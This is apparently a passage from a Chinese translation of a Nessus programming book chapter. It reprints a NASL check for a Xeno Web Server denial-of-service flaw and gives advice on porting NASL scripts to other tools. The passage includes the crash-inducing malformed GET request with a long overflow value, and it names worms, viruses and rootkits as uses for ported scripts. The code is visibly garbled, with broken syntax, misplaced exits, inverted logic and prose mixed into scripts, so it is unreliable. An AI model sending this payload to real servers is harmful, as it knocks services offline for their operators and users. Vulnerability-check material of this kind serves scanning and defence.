
# Xeno Web Server 2.2.10.0 Dos

```nasl
# Xeno Web Server 2.2.10.0 Dos
#
# Vulnerable Systems:
#
# Xeno Web Server 2.2.10.0 Dos
#
# Vendor:
#
# http://www.northsolutions.com
#
# Credit:
# Based on an advisory release by badpacket3 and `Foster
# For Security Protocols Labs [April 23, 2003]
# http://security-protocols.com/article.php?sid=1481
#
# History:
# Xeno Web Server 2.2.9.0 遭受了两次 DoS 攻击：
# (1) Xeno_Web_Server_2.2.9.0_Dos.nasl
# 此攻击通过请求一个以问号开头的超长
# URL 来杀死服务器（例如
/AAAAAAA）
# 此 DoS 由 badpacket3 发现并由 Foster 编写。
# NASL 已由 von BEKRAR Chaoki 检查过。
#
# (2) Xeno_Percent_Dos.nasl
# 此攻击通过请求 `%%A` 来杀死服务器。
# 此由 Carsten H. Hiram <secsunia.com> 发现，
# 但 NASL 已由 Michel Arroi 检查过。
```

```nasl
if ( script("version:1.0*") {
name("english") = "Xeno Web Server 2.2.10.0 Dos";
name("francais") = "Xeno Web Server 2.2.10.0 Dos";
script_name(english:"english", francais:name:"francais");

desc("english") = "
该漏洞是在另外两个影响 Xeno Web Server 2.2.9.0 的漏洞之后被发现的。该漏洞执行了一个略有不同的 GET 请求，但结果相同 - Xeno Web Server
```

## Nessus 编程 • 第 9 章 505

37 解决方案：升级到 Xeno Web Server 的最新版本

38 风险因素："高";

```nasl
40 script_description(english:desc["english"]);
41
42 summary["english"] = "Xeno Web Server 2.2.10.0 DoS"
43 summary["francais"] = "Xeno Web Server 2.2.10.0 DoS"
44 script_summary(summary["english"],
45 francais:summary["francais"]
46
47 script_category(ACT_DENIAL);
48
49 script_copyright(english:"No copyright.");
50
51 family["english"] = "Denial of Service"
52 family["francais"] = "Deni de Service"
53 script_family(english:family["english"],
54 francais:family["francais"])
55 script_dependency("find_service.ness");
56 script_requires("Services/www",80);
57
58 exit(0);
59
60 include("http_func.inc");
61
62 port = get_kb_item("Services/www");
63 if (port) port = 80;
64 if (safe_checks()) {
65 # 启用安全检查，仅执行 banner 检查
66 b = get_http_banner(port);
67
68 # 这应该匹配 Xeno/2.0, 2.1 和 2.2.0-2.
69 if (b =~ "Server: Xeno/2\.0([0-9]|2\.1))") {
70 report(
71 Xeno Web Server 版本 2.2.10.0 可能会被
72 畸形的 GET 请求崩溃，该请求由
73 数百个符号和一个名为 whatoutput 的变量组成
74 # 注意 Nessus 没有进行真实测试，
75 只是检查了 banner 中的版本号
76 解决方案：升级到 Xeno Web Server 的最新版本。
77 风险因素："高";
78
79 security_hole(port, data: report);
80
81 exit(0);
82 } else {
```

# 第 9 章 • Nessus 编程

```nasl
# 未启用安全检查，尝试 DoS 攻击
if ( http_is_dead(port:port) ) exit(0);
```

```nasl
soc = http_open_socket(port);
if ( soc) {
    payload = "GET /index.html?testvariable=&nextvariable=gif HTTP/1.1
Referer: http://localhost/
Content-Type: application/x-form-urlencoded
Connection: Keep-Alive
Cookie: Variable=path=/
User-Agent: Mozilla/4.0 (compatible; Linux 2.4; i686
Host: localhost
Content-Length: 0
Accept: image/gif,image/bitmap,image/jpeg
Accept-Encoding: gzip
Accept-Language: en-US
Accept-Charset: ISO-8859-1,*
whatoutput=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

```nasl
# 发送 payload;
send(soc,payload);
rc = http_recv(soc);
http_close_socket(soc)
```

```nasl
# 如果服务器已宕机，报告严重的安全漏洞
if ( http_is_dead(port) ) security_hole(port);
```

# 从 NASL 移植

可以反转上述过程，将 NASL 移植到其他语言。你可能想这么做的几个原因：

- 与 Perl 或 Java 相比，NASL 包含速度慢，且比 C 或 C++ 慢得多。
- 你可能想将 NASL 脚本的效果整合到其他工具（例如漏洞扫描工具、蠕虫、病毒或根内核）。
- 你可能想通过 Nessus 以外的界面运行脚本，例如直接从 Web 服务器运行。

除非你已经是目标语言的专家，否则将代码从 NASL 翻译其他语言比较困难，因为 Nessus 编程框架（包括知识库和 NASL 库函数）已经为你完成了大量工作。

- 1. 建立一个受漏洞的目标系统和一个本地嗅探器。目标系统将用于测试脚本和端口，嗅探器将确保在链路上传输的比特位完全一致。
- 2. 始终在目标端口语言中处理 socket 的创建。一旦你有了发送有效负载（payload）的能力，就可以专注于有效负载的创建。
- 3. 如果你没有使用支持正则表达式的脚本语言，而 NASL 脚本实现了正则表达式字符串，则请为 C/C++ 实现 PCRE 库。
- 4. 确保在移植时，脚本内部使用的数据类型已经过正确声明。
- 5. 在所有语言中（JavaScript、Perl 或 Java 之外），你应该实现一个字符串类，这在你处理攻击有效负载和目标响应时会让事情变得更简单。
- 6. 最后，你的端口需要执行某些操作。由于你无法使用显示函数或将漏洞状态传回 Nessus 引擎，你必须决定最终目标。在大多数情况下，将 `VULNERABLE` 传递给 STDOUT 是可以的。

## 脚本案例

学习编写和设计 NASL 脚本的最佳方法之一是通过示例学习并分析编写良好的脚本背后的代码。在本节中，我们将通过首先分析漏洞本身，然后检查漏洞检查的 NASL 实现来分析几个脚本。通过这样做，我们将对 NASL 语言语法以及它在现实世界中的用法有更深入理解。

## Microsoft IIS HTR ISAPI 扩展缓冲区溢出漏洞
